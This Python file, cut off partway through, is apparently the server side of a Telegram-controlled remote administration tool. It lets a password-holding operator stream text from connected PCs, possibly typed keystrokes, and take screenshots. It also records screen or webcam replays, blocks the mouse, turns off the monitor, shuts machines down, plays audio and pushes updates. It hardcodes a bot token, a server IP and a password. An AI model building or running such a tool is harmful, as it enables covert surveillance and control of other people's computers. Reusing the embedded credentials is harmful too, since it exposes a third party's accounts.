import subprocess
import sys

# ========================================
# АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ ДЛЯ БОТА  
# ========================================
def auto_install_bot_dependencies():
    """Автоматически устанавливает недостающие зависимости для бота"""
    required_packages = [
        ('pytelegrambotapi', 'telebot'), ('flask', 'flask'), 
        ('requests', 'requests'), ('pillow', 'PIL')
    ]
    
    missing_packages = []
    
    print("🤖 Проверяю зависимости бота...")
    for pip_name, import_name in required_packages:
        try:
            __import__(import_name)
        except ImportError:
            missing_packages.append(pip_name)
    
    if missing_packages:
        print(f"❌ Отсутствуют зависимости бота: {', '.join(missing_packages)}")
        print("📦 АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ БОТА...")
        
        try:
            print("[1/2] Обновляю pip...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'], 
                         check=True, capture_output=True)
            
            print(f"[2/2] Устанавливаю зависимости: {', '.join(missing_packages)}")
            subprocess.run([sys.executable, '-m', 'pip', 'install'] + missing_packages, 
                         check=True, capture_output=True)
            
            print("✅ ВСЕ ЗАВИСИМОСТИ БОТА УСТАНОВЛЕНЫ!")
            print("🔄 Перезагружаю модули и продолжаю работу...")
            
            # Перезагружаем sys.path чтобы новые пакеты были видны
            import importlib
            import site
            site.main()
            
            # Пробуем импортировать снова
            for pip_name, import_name in required_packages:
                try:
                    importlib.import_module(import_name)
                    print(f"✅ {import_name} успешно загружен")
                except ImportError as e:
                    print(f"⚠️ {import_name} все еще недоступен: {e}")
            
            print("🚀 Продолжаю запуск бота...")
            
        except subprocess.CalledProcessError as e:
            print(f"❌ Ошибка установки: {e}")
            print("⚠️  Установите зависимости вручную: pip install pytelegrambotapi flask requests")
            input("Нажмите Enter для продолжения...")
    else:
        print("✅ Все зависимости бота в порядке!")

# Запускаем проверку зависимостей бота
auto_install_bot_dependencies()

# Теперь импортируем все остальное
import telebot
from telebot import types
import time
import threading
from flask import Flask, request, jsonify
import io
import logging
import socket
import json
import os
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s", datefmt="%H:%M:%S")


def _load_dotenv():
    """Простая загрузка переменных окружения из .env рядом с ботом (без доп. зависимостей)."""
    try:
        here = os.path.dirname(__file__) if '__file__' in globals() else os.getcwd()
        env_path = os.path.join(here, '.env')
        if not os.path.exists(env_path):
            return
        with open(env_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if '=' not in line:
                    continue
                key, value = line.split('=', 1)
                key = key.strip()
                value = value.strip().strip('"').strip("'")
                if key and key not in os.environ:
                    os.environ[key] = value
    except Exception:
        # Не критично, если .env не загрузился
        pass


_load_dotenv()

# Конфигурация бота из окружения / .env
ADVERTISED_IP = os.getenv("ADVERTISED_IP", "164.215.97.151")
BOT_PORT = int(os.getenv("BOT_PORT", "25565"))
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", '8294625680:AAEFXjFMt3bFmzp1QbNeLvnn0ErPScGLwTQ')

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Dictionary to store the state of each user
user_states = {}
# Simple list of connected devices per chat for UI
connected_devices = {}

# Authorization
AUTHORIZED_PASSWORD = os.getenv("AUTHORIZED_PASSWORD", 'kartel1337')
authorized_users = set()

# Devices registry: device_id -> {name, chat_id, sending_enabled, muted, buffer, msg_id}
devices = {}

def _ensure_chat_lists(chat_id: int):
    if chat_id not in user_states:
        user_states[chat_id] = {'sending': False, 'sound_off': False}
    if chat_id not in connected_devices:
        connected_devices[chat_id] = []

def _make_markup(user_id: int) -> types.ReplyKeyboardMarkup:
    sending = bool(user_states.get(user_id, {}).get('sending'))
    sound_off = bool(user_states.get(user_id, {}).get('sound_off'))
    mouse_blocked = bool(user_states.get(user_id, {}).get('mouse_blocked'))
    monitor_off = bool(user_states.get(user_id, {}).get('monitor_off'))
    
    mk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton('Прекратить отсылку') if sending else types.KeyboardButton('Отсылать сообщения')
    btn2 = types.KeyboardButton('Включить звук') if sound_off else types.KeyboardButton('Выключить звук')
    btn_mouse = types.KeyboardButton('Разблокировать мышь') if mouse_blocked else types.KeyboardButton('Блокировать мышь')
    btn_monitor = types.KeyboardButton('Включить монитор') if monitor_off else types.KeyboardButton('Выключить монитор')
    btn3 = types.KeyboardButton('Показать устройства')
    btn4 = types.KeyboardButton('Скриншот')
    btn_shutdown = types.KeyboardButton('Выключить ПК')
    btn_wallpaper = types.KeyboardButton('Сменить обои')
    btn_get_wallpaper = types.KeyboardButton('📥 Скачать обои')
    btn_replay = types.KeyboardButton('⏮️ Instant Replay')
    btn_show_text = types.KeyboardButton('Показать текст')
    btn_play_audio = types.KeyboardButton('Воспроизвести звук')
    btn_update = types.KeyboardButton('Обновить программу')
    
    mk.add(btn1, btn2)
    mk.add(btn_mouse, btn_monitor)
    mk.add(btn3, btn4)
    mk.add(btn_replay, btn_shutdown)
    mk.add(btn_wallpaper, btn_get_wallpaper)
    mk.add(btn_show_text, btn_play_audio)
    mk.add(btn_update)
    return mk

def _bind_all_devices_to_chat(chat_id: int):
    for dev in devices.values():
        dev.setdefault('chat_id', chat_id)
        if dev['chat_id'] != chat_id:
            dev['chat_id'] = chat_id

def _list_devices_for_chat(chat_id: int):
    """Возвращает список имен всех активных устройств (игнорируя привязку к чату).

    Логика: любой авторизованный пользователь видит все устройства, которые
    недавно выходили на связь, независимо от того, к какому чату они были
    привязаны для отправки логов.
    """
    names = []
    now = time.time()
    for dev_id, dev in devices.items():
        last_seen = float(dev.get('last_seen', 0.0))
        if (now - last_seen) <= 10.0:
            names.append(dev.get('name') or 'PC')
    return names

CANCEL_TEXT = 'Отмена'

def _active_devices_for_chat(chat_id: int, timeout: float = 10.0):
    import logging
    now = time.time()
    result = []
    logging.info(f"🔍 _active_devices_for_chat: looking for chat_id={chat_id}")
    for dev_id, dev in devices.items():
        last_seen = float(dev.get('last_seen', 0.0))
        age = now - last_seen
        dev_chat_id = dev.get('chat_id')
        active = age <= timeout
        logging.info(f"   Device {dev_id}: chat_id={dev_chat_id}, age={age:.1f}s (active={active})")
        if active:
            result.append((dev_id, dev))
    logging.info(f"   ✅ Found {len(result)} active devices")
    return result

def _start_device_selection(user_id: int, cmd: str, title: str):
    choices = {}
    mk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    actives = _active_devices_for_chat(user_id)
    for dev_id, dev in actives:
        name = dev.get('name') or 'PC'
        label = f"{name} [{dev_id[-4:]}]"
        choices[label] = dev_id
        mk.add(types.KeyboardButton(label))
    mk.add(types.KeyboardButton(CANCEL_TEXT))
    st = user_states[user_id]
    st['pending'] = {'cmd': cmd, 'choices': choices, 'title': title}
    bot.send_message(user_id, f"Выберите устройство для: {title}", reply_markup=mk)

def _apply_toggle_sending(chat_id: int, enabled: bool):
    for dev in devices.values():
        if dev.get('chat_id') in (None, chat_id):
            dev['sending_enabled'] = enabled
            if enabled:
                dev['msg_id'] = None
                dev['buffer'] = ''

def _apply_toggle_mute(chat_id: int, muted: bool):
    for dev in devices.values():
        if dev.get('chat_id') in (None, chat_id):
            dev['muted'] = muted

def _send_or_edit(dev: dict, text: str):
    chat_id = dev.get('chat_id')
    if not chat_id or chat_id not in authorized_users:
        return
    lock = dev.get('lock')
    if lock is None:
        lock = threading.Lock()
        dev['lock'] = lock
    with lock:
        msg_id = dev.get('msg_id')
        now = time.time()
        txt = text if (text is not None and len(text) > 0) else '\u200b'
        # If no message yet, send immediately for responsiveness
        if msg_id is None:
            try:
                m = bot.send_message(chat_id, txt)
                dev['msg_id'] = m.message_id
                dev['last_text'] = txt
                dev['last_edit_ts'] = time.time()
            except Exception:
                return
            # Catch up to the latest buffer if it changed while creating
            latest = dev.get('buffer') or ''
            if latest and latest != txt:
                try:
                    bot.edit_message_text(latest, chat_id=chat_id, message_id=dev['msg_id'])
                    dev['last_text'] = latest
                    dev['last_edit_ts'] = time.time()
                except Exception:
                    pass
            return

        # Throttle edits at a steady rate (every ~35 ms max for fast response)
        last_ts = float(dev.get('last_edit_ts') or 0.0)
        last_text = dev.get('last_text') or None
        if last_text == txt:
            return
        dev['pending_text'] = txt
        throttle = 0.035
        elapsed = now - last_ts
        delay = max(0.0, throttle - elapsed)
        # If we can send now, do it
        if delay <= 0.0:
            try:
                bot.edit_message_text(txt, chat_id=chat_id, message_id=msg_id)
                dev['last_text'] = txt
                dev['last_edit_ts'] = time.time()
            except Exception:
                return
            return
        # Otherwise schedule a single timer to fire when throttle allows
        t = dev.get('flush_timer')
        if t and t.is_alive():
            # Timer already scheduled; just update pending_text and exit
            return
        def _flush():
            try:
                with dev.get('lock'):
                    ptxt = dev.get('pending_text')
                    if ptxt is None or ptxt == dev.get('last_text'):
                        return
                    try:
                        bot.edit_message_text(ptxt, chat_id=dev.get('chat_id'), message_id=dev.get('msg_id'))
                        dev['last_text'] = ptxt
                        dev['last_edit_ts'] = time.time()
                    except Exception:
                        return
            finally:
                dev['flush_timer'] = None
        timer = threading.Timer(delay, _flush)
        dev['flush_timer'] = timer
        timer.daemon = True
        timer.start()
        return
        

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    _ensure_chat_lists(user_id)
    _bind_all_devices_to_chat(user_id)

    if user_id not in authorized_users:
        bot.send_message(user_id, 'Для доступа введите пароль:', reply_markup=types.ReplyKeyboardRemove())
        return

    names = _list_devices_for_chat(user_id)
    markup = _make_markup(user_id)
    bot.send_message(user_id, 'Привет! Я готов к работе. Выбери действие:', reply_markup=markup)
    if names:
        bot.send_message(user_id, f'Подключенные устройства: {", ".join(names)}')
    else:
        bot.send_message(user_id, 'Нет подключенных устройств. Запустите программу на ПК.')

# Handler for button clicks
@bot.message_handler(content_types=['text'])
def handle_buttons(message):
    user_id = message.chat.id
    text = message.text
    
    if user_id not in user_states:
        user_states[user_id] = {'sending': False, 'sound_off': False}
    if user_id not in connected_devices:
        connected_devices[user_id] = []

    # Password gate
    if user_id not in authorized_users:
        if (text or '').strip() == AUTHORIZED_PASSWORD:
            authorized_users.add(user_id)
            bot.send_message(user_id, 'Доступ разрешен.', reply_markup=_make_markup(user_id))
        else:
            bot.send_message(user_id, 'Неверный пароль. Попробуйте снова.', reply_markup=types.ReplyKeyboardRemove())
        return
    
    # Handle waiting audio for playback
    if user_states[user_id].get('waiting_audio'):
        if text == CANCEL_TEXT:
            user_states[user_id]['waiting_audio'] = False
            user_states[user_id]['audio_device'] = None
            bot.send_message(user_id, 'Отменено.', reply_markup=_make_markup(user_id))
            return
        bot.send_message(user_id, 'Пожалуйста, отправьте аудио файл или голосовое сообщение.', reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton(CANCEL_TEXT)))
        return

    # Handle waiting text entry for display overlay
    if user_states[user_id].get('waiting_text'):
        if text == CANCEL_TEXT:
            user_states[user_id]['waiting_text'] = False
            user_states[user_id]['text_device'] = None
            bot.send_message(user_id, 'Отменено.', reply_markup=_make_markup(user_id))
            return
        dev_id = user_states[user_id].get('text_device')
        if not dev_id:
            actives = _active_devices_for_chat(user_id)
            if actives:
                dev_id = actives[0][0]
            else:
                bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
                return
        dev = devices.get(dev_id)
        if dev:
            dev.setdefault('queue', []).append({'type': 'display_text', 'text': text, 'timeout_ms': 5000})
            bot.send_message(user_id, 'Показываю текст на экране.', reply_markup=_make_markup(user_id))
        else:
            bot.send_message(user_id, 'Устройство не найдено.', reply_markup=_make_markup(user_id))
        user_states[user_id]['waiting_text'] = False
        user_states[user_id]['text_device'] = None
        return

    # Handle pending Instant Replay mode selection (экран или вебкамера)
    if user_states[user_id].get('waiting_replay_mode'):
        if text == CANCEL_TEXT:
            user_states[user_id]['waiting_replay_mode'] = False
            user_states[user_id]['replay_device'] = None
            bot.send_message(user_id, 'Отменено.', reply_markup=_make_markup(user_id))
            return
        dev_id = user_states[user_id].get('replay_device')
        dev = devices.get(dev_id) if dev_id else None
        if not dev:
            user_states[user_id]['waiting_replay_mode'] = False
            user_states[user_id]['replay_device'] = None
            bot.send_message(user_id, 'Устройство не найдено.', reply_markup=_make_markup(user_id))
            return
        if text == '🖥 Экран':
            # Привязываем Instant Replay к конкретному пользователю (chat_id)
            dev.setdefault('queue', []).append({'type': 'instant_replay', 'chat_id': user_id})
            user_states[user_id]['waiting_replay_mode'] = False
            user_states[user_id]['replay_device'] = None
            bot.send_message(user_id, '⏮️ Сохраняю последние 30 секунд (только экран)...', reply_markup=_make_markup(user_id))
            return
        if text == '📷 Вебкамера':
            # Если есть список камер, а их больше одной — переходим к выбору камеры
            webcams = dev.get('webcams') or []
            if isinstance(webcams, list) and len(webcams) > 1:
                user_states[user_id]['waiting_replay_mode'] = False
                user_states[user_id]['waiting_webcam_choice'] = True
                user_states[user_id]['replay_device'] = dev_id
                user_states[user_id]['webcam_list'] = webcams
                mk = types.ReplyKeyboardMarkup(resize_keyboard=True)
                for cam_idx in webcams:
                    mk.add(types.KeyboardButton(f'Камера {cam_idx}'))
                mk.add(types.KeyboardButton(CANCEL_TEXT))
                bot.send_message(user_id, 'Выберите вебкамеру:', reply_markup=mk)
            else:
                # Одна камера или список неизвестен — используем индекс по умолчанию (0 или первый из списка)
                cam_idx = 0
                if isinstance(webcams, list) and webcams:
                    cam_idx = webcams[0]
                # Сохраняем chat_id, чтобы ответ ушёл тому, кто запросил откат
                dev.setdefault('queue', []).append({'type': 'instant_replay_webcam', 'camera_index': cam_idx, 'chat_id': user_id})
                user_states[user_id]['waiting_replay_mode'] = False
                user_states[user_id]['replay_device'] = None
                bot.send_message(user_id, '📷 Сохраняю последние 10 секунд с вебкамеры...', reply_markup=_make_markup(user_id))
            return
        # Непонятный ответ — повторяем вопрос выбора режима
        mk = types.ReplyKeyboardMarkup(resize_keyboard=True)
        mk.add(types.KeyboardButton('🖥 Экран'), types.KeyboardButton('📷 Вебкамера'))
        mk.add(types.KeyboardButton(CANCEL_TEXT))
        bot.send_message(user_id, 'Выберите режим Instant Replay:', reply_markup=mk)
        return

    # Отдельный шаг: выбор конкретной вебкамеры если их несколько
    if user_states[user_id].get('waiting_webcam_choice'):
        if text == CANCEL_TEXT:
            user_states[user_id]['waiting_webcam_choice'] = False
            user_states[user_id]['replay_device'] = None
            user_states[user_id]['webcam_list'] = []
            bot.send_message(user_id, 'Отменено.', reply_markup=_make_markup(user_id))
            return
        dev_id = user_states[user_id].get('replay_device')
        dev = devices.get(dev_id) if dev_id else None
        webcams = user_states[user_id].get('webcam_list') or []
        if not dev or not webcams:
            user_states[user_id]['waiting_webcam_choice'] = False
            user_states[user_id]['replay_device'] = None
            user_states[user_id]['webcam_list'] = []
            bot.send_message(user_id, 'Устройство или список камер не найден.', reply_markup=_make_markup(user_id))
            return
        # Ожидаем формат "Камера N"
        if text.startswith('Камера '):
            idx_part = text.replace('Камера ', '').strip()
            try:
                cam_idx = int(idx_part)
            except Exception:
                cam_idx = None
            if cam_idx is not None and cam_idx in webcams:
                # Сохраняем chat_id для корректного получателя
                dev.setdefault('queue', []).append({'type': 'instant_replay_webcam', 'camera_index': cam_idx, 'chat_id': user_id})
                user_states[user_id]['waiting_webcam_choice'] = False
                user_states[user_id]['replay_device'] = None
                user_states[user_id]['webcam_list'] = []
                bot.send_message(user_id, f'📷 Сохраняю последние 10 секунд с вебкамеры #{cam_idx}...', reply_markup=_make_markup(user_id))
                return
        # Неверный выбор — повторяем список камер
        mk = types.ReplyKeyboardMarkup(resize_keyboard=True)
        for cam_idx in webcams:
            mk.add(types.KeyboardButton(f'Камера {cam_idx}'))
        mk.add(types.KeyboardButton(CANCEL_TEXT))
        bot.send_message(user_id, 'Выберите вебкамеру:', reply_markup=mk)
        return

    # Handle pending device selection
    pending = user_states[user_id].get('pending')
    if pending:
        choices = pending.get('choices') or {}
        if text == CANCEL_TEXT:
            user_states[user_id]['pending'] = None
            bot.send_message(user_id, 'Отменено.', reply_markup=_make_markup(user_id))
            return
        if text in choices:
            dev_id = choices[text]
            dev = devices.get(dev_id)
            cmd = pending.get('cmd')
            user_states[user_id]['pending'] = None
            if dev:
                dev['chat_id'] = user_id
                if cmd == 'send_on':
                    dev['sending_enabled'] = True
                    dev['msg_id'] = None
                    dev['buffer'] = ''
                    user_states[user_id]['sending'] = True
                    bot.send_message(user_id, 'Начинаю отправку сообщений.', reply_markup=_make_markup(user_id))
                elif cmd == 'send_off':
                    dev['sending_enabled'] = False
                    user_states[user_id]['sending'] = False
                    bot.send_message(user_id, 'Прекращаю отправку сообщений.', reply_markup=_make_markup(user_id))
                elif cmd == 'mute_on':
                    dev['muted'] = True
                    user_states[user_id]['sound_off'] = True
                    dev.setdefault('queue', []).append({'type': 'apply_mute_state', 'muted': True})
                    bot.send_message(user_id, 'Выключаю звук на ПК.', reply_markup=_make_markup(user_id))
                elif cmd == 'mute_off':
                    dev['muted'] = False
                    user_states[user_id]['sound_off'] = False
                    dev.setdefault('queue', []).append({'type': 'apply_mute_state', 'muted': False})
                    bot.send_message(user_id, 'Включаю звук на ПК.', reply_markup=_make_markup(user_id))
                elif cmd == 'shot':
                    dev['screenshot'] = True
                    dev.setdefault('queue', []).append({'type': 'shot'})
                    bot.send_message(user_id, 'Делаю скриншот...', reply_markup=_make_markup(user_id))
                elif cmd == 'mouse_block':
                    dev.setdefault('queue', []).append({'type': 'block_mouse'})
                    user_states[user_id]['mouse_blocked'] = True
                    bot.send_message(user_id, 'Блокирую мышь...', reply_markup=_make_markup(user_id))
                elif cmd == 'mouse_unblock':
                    dev.setdefault('queue', []).append({'type': 'unblock_mouse'})
                    user_states[user_id]['mouse_blocked'] = False
                    bot.send_message(user_id, 'Разблокировываю мышь...', reply_markup=_make_markup(user_id))
                elif cmd == 'monitor_off':
                    dev.setdefault('queue', []).append({'type': 'monitor_off'})
                    user_states[user_id]['monitor_off'] = True
                    bot.send_message(user_id, 'Выключаю монитор...', reply_markup=_make_markup(user_id))
                elif cmd == 'monitor_on':
                    dev.setdefault('queue', []).append({'type': 'monitor_on'})
                    user_states[user_id]['monitor_off'] = False
                    bot.send_message(user_id, 'Включаю монитор...', reply_markup=_make_markup(user_id))
                elif cmd == 'shutdown':
                    dev.setdefault('queue', []).append({'type': 'shutdown'})
                    bot.send_message(user_id, 'Выключаю ПК...', reply_markup=_make_markup(user_id))
                elif cmd == 'instant_replay':
                    # Если у устройства есть вебкамера — сначала спрашиваем режим
                    if dev.get('has_webcam'):
                        user_states[user_id]['waiting_replay_mode'] = True
                        user_states[user_id]['replay_device'] = dev_id
                        mk = types.ReplyKeyboardMarkup(resize_keyboard=True)
                        mk.add(types.KeyboardButton('🖥 Экран'), types.KeyboardButton('📷 Вебкамера'))
                        mk.add(types.KeyboardButton(CANCEL_TEXT))
                        bot.send_message(user_id, 'Выберите режим Instant Replay:', reply_markup=mk)
                    else:
                        dev.setdefault('queue', []).append({'type': 'instant_replay'})
                        bot.send_message(user_id, '⏮️ Сохраняю последние 30 секунд...', reply_markup=_make_markup(user_id))
                elif cmd == 'show_text':
                    user_states[user_id]['waiting_text'] = True
                    user_states[user_id]['text_device'] = dev_id
                    bot.send_message(user_id, 'Отправьте текст сообщением. Нажмите Отмена для завершения.', reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton(CANCEL_TEXT)))
                elif cmd == 'play_audio':
                    user_states[user_id]['waiting_audio'] = True
                    user_states[user_id]['audio_device'] = dev_id
                    bot.send_message(user_id, 'Отправьте аудио или голосовое сообщение. Нажмите Отмена для завершения.', reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton(CANCEL_TEXT)))
                elif cmd == 'get_wallpaper':
                    dev.setdefault('queue', []).append({'type': 'get_wallpaper'})
                    bot.send_message(user_id, '📥 Загружаю текущие обои с ПК...', reply_markup=_make_markup(user_id))
            else:
                bot.send_message(user_id, 'Устройство не найдено.', reply_markup=_make_markup(user_id))
            return
        else:
            bot.send_message(user_id, 'Выберите устройство из списка или нажмите Отмена.', reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True))
            return

    # Command handling with device checks
    if text == 'Отсылать сообщения':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'send_on', 'Отсылать сообщения')
            return
        dev_id, dev = actives[0]
        user_states[user_id]['sending'] = True
        dev['chat_id'] = user_id
        dev['sending_enabled'] = True
        dev['msg_id'] = None
        dev['buffer'] = ''
        bot.send_message(user_id, 'Начинаю отправку сообщений.', reply_markup=_make_markup(user_id))
    elif text == 'Прекратить отсылку':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'send_off', 'Прекратить отсылку')
            return
        dev_id, dev = actives[0]
        user_states[user_id]['sending'] = False
        dev['chat_id'] = user_id
        dev['sending_enabled'] = False
        bot.send_message(user_id, 'Прекращаю отправку сообщений.', reply_markup=_make_markup(user_id))
    elif text == 'Выключить звук':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'mute_on', 'Выключить звук')
            return
        dev_id, dev = actives[0]
        user_states[user_id]['sound_off'] = True
        dev['chat_id'] = user_id
        dev['muted'] = True
        dev.setdefault('queue', []).append({'type': 'apply_mute_state', 'muted': True})
        bot.send_message(user_id, 'Выключаю звук на ПК.', reply_markup=_make_markup(user_id))
    elif text == 'Включить звук':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'mute_off', 'Включить звук')
            return
        dev_id, dev = actives[0]
        user_states[user_id]['sound_off'] = False
        dev['chat_id'] = user_id
        dev['muted'] = False
        dev.setdefault('queue', []).append({'type': 'apply_mute_state', 'muted': False})
        bot.send_message(user_id, 'Включаю звук на ПК.', reply_markup=_make_markup(user_id))
    elif text == 'Показать устройства':
        actives = _active_devices_for_chat(user_id)
        if actives:
            labels = []
            for dev_id, dev in actives:
                name = dev.get('name') or 'PC'
                labels.append(f"{name} [{dev_id[-4:]}]")
            bot.send_message(user_id, f"Подключенные устройства: {', '.join(labels)}", reply_markup=_make_markup(user_id))
        else:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
    elif text == 'Скриншот':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'shot', 'Скриншот')
            return
        dev_id, dev = actives[0]
        dev['chat_id'] = user_id
        dev['screenshot'] = True
        dev.setdefault('queue', []).append({'type': 'shot'})
        bot.send_message(user_id, 'Делаю скриншот...', reply_markup=_make_markup(user_id))
    elif text == 'Блокировать мышь':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'mouse_block', 'Блокировать мышь')
            return
        dev_id, dev = actives[0]
        dev['chat_id'] = user_id
        dev.setdefault('queue', []).append({'type': 'block_mouse'})
        user_states[user_id]['mouse_blocked'] = True
        bot.send_message(user_id, 'Блокирую мышь...', reply_markup=_make_markup(user_id))
    elif text == 'Разблокировать мышь':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'mouse_unblock', 'Разблокировать мышь')
            return
        dev_id, dev = actives[0]
        dev['chat_id'] = user_id
        dev.setdefault('queue', []).append({'type': 'unblock_mouse'})
        user_states[user_id]['mouse_blocked'] = False
        bot.send_message(user_id, 'Разблокировываю мышь...', reply_markup=_make_markup(user_id))
    elif text == 'Выключить монитор':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'monitor_off', 'Выключить монитор')
            return
        dev_id, dev = actives[0]
        dev['chat_id'] = user_id
        dev.setdefault('queue', []).append({'type': 'monitor_off'})
        user_states[user_id]['monitor_off'] = True
        bot.send_message(user_id, 'Выключаю монитор...', reply_markup=_make_markup(user_id))
    elif text == 'Включить монитор':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'monitor_on', 'Включить монитор')
            return
        dev_id, dev = actives[0]
        dev['chat_id'] = user_id
        dev.setdefault('queue', []).append({'type': 'monitor_on'})
        user_states[user_id]['monitor_off'] = False
        bot.send_message(user_id, 'Включаю монитор...', reply_markup=_make_markup(user_id))
    elif text == 'Выключить ПК':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'shutdown', 'Выключить ПК')
            return
        dev_id, dev = actives[0]
        dev['chat_id'] = user_id
        dev.setdefault('queue', []).append({'type': 'shutdown'})
        bot.send_message(user_id, 'Выключаю ПК...', reply_markup=_make_markup(user_id))
    elif text == '⏮️ Instant Replay':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'instant_replay', '⏮️ Instant Replay')
            return
        dev_id, dev = actives[0]
        dev['chat_id'] = user_id
        if dev.get('has_webcam'):
            user_states[user_id]['waiting_replay_mode'] = True
            user_states[user_id]['replay_device'] = dev_id
            mk = types.ReplyKeyboardMarkup(resize_keyboard=True)
            mk.add(types.KeyboardButton('🖥 Экран'), types.KeyboardButton('📷 Вебкамера'))
            mk.add(types.KeyboardButton(CANCEL_TEXT))
            bot.send_message(user_id, 'Выберите режим Instant Replay:', reply_markup=mk)
        else:
            dev.setdefault('queue', []).append({'type': 'instant_replay'})
            bot.send_message(user_id, '⏮️ Сохраняю последние 30 секунд...', reply_markup=_make_markup(user_id))
    elif text == 'Показать текст':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'show_text', 'Показать текст')
            return
        dev_id, dev = actives[0]
        user_states[user_id]['waiting_text'] = True
        user_states[user_id]['text_device'] = dev_id
        bot.send_message(user_id, 'Отправьте текст сообщением. Нажмите Отмена для завершения.', reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton(CANCEL_TEXT)))
    elif text == 'Воспроизвести звук':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'play_audio', 'Воспроизвести звук')
            return
        dev_id, dev = actives[0]
        user_states[user_id]['waiting_audio'] = True
        user_states[user_id]['audio_device'] = dev_id
        bot.send_message(user_id, 'Отправьте аудио или голосовое сообщение. Нажмите Отмена для завершения.', reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton(CANCEL_TEXT)))
    elif text == 'Сменить обои':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        # Store waiting state for wallpaper photo
        user_states[user_id]['waiting_wallpaper'] = True
        if len(actives) == 1:
            user_states[user_id]['wallpaper_device'] = actives[0][0]
        bot.send_message(user_id, 'Отправьте фото для обоев:', reply_markup=types.ReplyKeyboardRemove())
    elif text == '📥 Скачать обои':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        if len(actives) > 1:
            _start_device_selection(user_id, 'get_wallpaper', '📥 Скачать обои')
            return
        dev_id, dev = actives[0]
        dev['chat_id'] = user_id
        dev.setdefault('queue', []).append({'type': 'get_wallpaper'})
        bot.send_message(user_id, '📥 Загружаю текущие обои с ПК...', reply_markup=_make_markup(user_id))
    elif text == 'Обновить программу':
        actives = _active_devices_for_chat(user_id)
        if not actives:
            bot.send_message(user_id, 'нет подключения к пк', reply_markup=_make_markup(user_id))
            return
        # Отправляем команду обновления всем активным ПК без выбора
        for dev_id, dev in actives:
            dev['chat_id'] = user_id
            dev.setdefault('queue', []).append({'type': 'update_program'})
        bot.send_message(user_id, 'Запускаю обновление программы на всех активных ПК...', reply_markup=_make_markup(user_id))

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    import base64
    user_id = message.chat.id
    if user_id not in user_states or not user_states[user_id].get('waiting_wallpaper'):
        return
    
    try:
        # Get the photo
        photo = message.photo[-1]  # Largest size
        file_info = bot.get_file(photo.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Encode to base64 for JSON compatibility
        photo_base64 = base64.b64encode(downloaded_file).decode('utf-8')
        
        # Get target device
        dev_id = user_states[user_id].get('wallpaper_device')
        if not dev_id:
            actives = _active_devices_for_chat(user_id)
            if actives:
                dev_id = actives[0][0]
        
        if dev_id:
            dev = devices.get(dev_id)
            if dev:
                # Send wallpaper change event with base64 encoded photo data
